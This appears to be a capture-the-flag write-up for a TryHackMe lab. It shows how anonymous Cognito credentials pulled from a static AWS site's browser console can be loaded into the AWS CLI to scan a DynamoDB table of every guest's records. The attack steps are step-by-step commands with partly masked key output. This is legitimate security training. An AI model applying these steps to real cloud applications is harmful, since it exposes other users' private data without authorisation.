# Complimentary

Install the free app and it hands your phone a set of cloud keys, the same set it hands everyone. They're read-only, but read-only of every guest's contacts, location, and passwords, not just Lambo's. She gave consent. Technically.

# Enumeration

The application was hosted as an AWS S3 static website.

```
http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
```

The landing page displayed a guest dashboard with no login functionality.

The page stated:

> "No account needed — we set you up as a guest the moment you arrived."
> 

This suggested that anonymous users were automatically authenticated.

---

# Source Code Analysis

Inspecting the JavaScript (`app.js`) revealed several important values.

```
constIDENTITY_POOL_ID="us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";constAWS_REGION="us-east-1";constTABLE_NAME="complimentary-GuestWellnessProfiles";
```

The application initialized Amazon Cognito credentials.

```
AWS.config.credentials=newAWS.CognitoIdentityCredentials({
    IdentityPoolId:IDENTITY_POOL_ID,
});
```

The dashboard then accessed DynamoDB.

```
constdynamodb=newAWS.DynamoDB({
    region:AWS_REGION
});
```

Data was retrieved using:

```
dynamodb.getItem(...)
```

---

---

To verify the permissions assigned to anonymous users, inspect the Cognito credentials that the application retrieves. Open the browser Developer Tool’s (F12) console and execute:

```bash
console.log({
  accessKeyId: AWS.config.credentials.accessKeyId,
  secretAccessKey: AWS.config.credentials.secretAccessKey,
  sessionToken: AWS.config.credentials.sessionToken,
  identityId: AWS.config.credentials.identityId
});
```

this will give this type of output : 

```bash
{accessKeyId: 'ASIAU2VYxxxx6JOWQS5', secretAccessKey: 'k8Uxxxxxxotn3BQuqv7PYYqq2HDpWCLL0mpue', sessionToken: 'IQoJb3JpZ2luX2VjEMr//////////wEaCXVzLWVhc3QtMSJHME…cgRdo3ZRmWHRbxkqQHzliAC7tpBijtWUEkZAhcBCtGMblD8LT', identityId: 'us-east-1:4d571309-b094-ca4d-7267-ee73a3f4cacb'}
accessKeyId
: 
"ASIAU2VYTBGYP6JOWQS5"
identityId
: 
"us-east-1:xxxxx-b094-ca4d-7267-exxxxx4cacb"
secretAccessKey
: 
"k8UAX58vD2q0otn3BxxxxxxxxxCLL0mpue"
sessionToken
: 
"IQoJb3JpZ2luX2VjEMr//////////wEaCxxxxxxxxxxxEUCIQD1fH1eX7L+ryl7skDwK+dcM8HFomqa+6ZVOhODUv8XOgIgJschPanoBHg+58gTp8xlUt23Gg6yJgY1UkzGxl/tAQkquAUIk///////////ARAAGgwzMzIxNzMzNDcyNDgiDPyz/stUqtcOXGPXtCqMBV+G4V1iQwRmECaTY8OeFw5QF6ybwwnEVCOxdSwkXd29mjuNFHcjv5Kv3Jev0cZd0yMTbyYxt7KGV1Px4cWccnk5n/JTCYF8P81I8bnm+iCGEmyRcV4ktnD299j3s1lYKjTEYHtcpNmyvIRzYnPGT7d6wfQJNd43xbGoM7S/dAU31OTfTvUtPoRiQmuzfWwxkjpz6tHLIi5A3UbDJ5QobCBknMZYmT9d5AVTMqInL/fn2tpLzv3XyRNDWMMwsfG4ZmbLOF4wiNX6TBfLMVyYZ2WLV1MOt1qREmVGPKljCpm62V9znwZ49w1aACkL+jetyr5g7GLY9eXuyPLIiwgfbpkW1RtwPimw/CI2Ds/WhNbo4MH31ssYrO/Zl5/Lf451FHNCvq2qcKmY4zPGvWOzAlrLRf4pUpLLgPvtrKJfmIX6W3A8F05C088PxuMRgWptHmCgFJSUve8Z/3DEXv5Pbp/nfoiDqxXy4gAdA3X/MTI469PBjrisBN4QriAFltEkZiin38NUpFhvbHFfFs2Drlmc9hUny3QdbsXi+x3i+NVb0oGXfJZuOJm0fLEHZBjSlx0rQS8j8S9pdk2LG+wlPjeDpB9iE3iYxT5//ZYU3TIuH1unqKAMal/t0OHS74umr9q5hCshz3MNlSiVkpYwk7gI6NP9k7irDQq9nVg4uRH8gHBuF0LbLtuGXMDLbD41KyzrjtEvYZunPmHAKVuPemU6tiHw4lIa8LEki8ZFYdNNob4CE8IaoPOAONp8UfwZ7BBUmKTjjCI+Tgt9jTKUVhHfWEKYSY9czOSdxTOvqlkP7+w7M2vN3FagIzA3iEmgAHT4LyS8jdynrZaM3Jk324fc/ObpLxU0zgUaVMownLOs0wY63QJGTgJGgwt4Tzbz47WfOtyo0Z2MlPjC8QMMKC/aVXzD6AoQp9k1wwy/xeVGZENGypt4qOebh6x1fpOHrcMjXWKDGlz4oYTdsITDc7GWkpIjVJntSJQp6q2qlPgba8xaFdIQmTiggjG72og7XxuptSGSDUj+1p+lSQ/8ThdTe5uXcXshR27/x/gdT3B33TpZsgc/OP/63S4H5W9gbJVsWoxr+I5dcUrNmRvRONzB9TI+KWMLVjIRQdTY3yYUKT5jL61G9oYYIwHcHREtFS65PB3bIFQ3gQfQBeXS8yrtnV/kb+hh4a81mXcj1Jkl7Fka3/xh7vNc33aPb32Aym4B1McRhka8jAZe7ILvlO59EYaijwT8MqJUF7g9xmFhQhk+uzE0GR9O4xDYDrNGBjCS/zAXt44BZX+GbSCcgRdo3ZRmWHRbxkqQHzliAC7tpBijtWUEkZAhcBCtGMblD8LT"
[[Prototype]]
: 
Object
```

the next step is to determine what those credentials are allowed to do. 

check the aws cli installation using the below command  , if not installed install it first : 

```bash
aws --version 
```

Configure the access key and secret key : 

```bash
aws configure
```

It will ask:

```
AWS Access Key ID [None]:
```

Paste your `accessKeyId`.

Then:

```
AWS Secret Access Key [None]:
```

Paste your `secretAccessKey`.

Then:

```
Default region name [None]:
```

Enter:

```
us-east-1
```

Then:

```
Default output format [None]:
```

Enter:

```
json
```

Set the session token : 

Since these are **temporary credentials**, you **must** set the session token in the current CMD window:

```
set AWS_SESSION_TOKEN=PASTE_YOUR_ENTIRE_SESSION_TOKEN_HERE
```

You won't see any output if it succeeds.

In  `app.js`, there was this line:

```
constTABLE_NAME="complimentary-GuestWellnessProfiles";
```

now try to **read every item in the DynamoDB table** named `complimentary-GuestWellnessProfiles`.

The application only performs a `GetItem()` request for the current guest.

To determine whether the IAM policy is overly permissive, test whether the temporary credentials can perform a `Scan` operation, which attempts to read every item stored in the table.

```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1
```

or use this to save the file as the test.json and then we will open this file in the notepad and will try to search for the string type THM{} to find the flag .

```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles --region us-east-1 > test.txt
```

then open this file in notepad using : 

```bash
notepad test.txt
```

The output contained multiple guest records. Since TryHackMe flags follow the format `THM{...}`, searching the output for `THM{` , i quickly identified the flag stored within one of the records.

```bash
THM{xx33_axp_xx33_xxxx!} 
```

# Vulnerability

The application issues temporary AWS credentials to every anonymous guest through an Amazon Cognito Identity Pool.

If the IAM policy attached to the guest role is overly permissive, any visitor can access data beyond their own profile, resulting in Broken Access Control.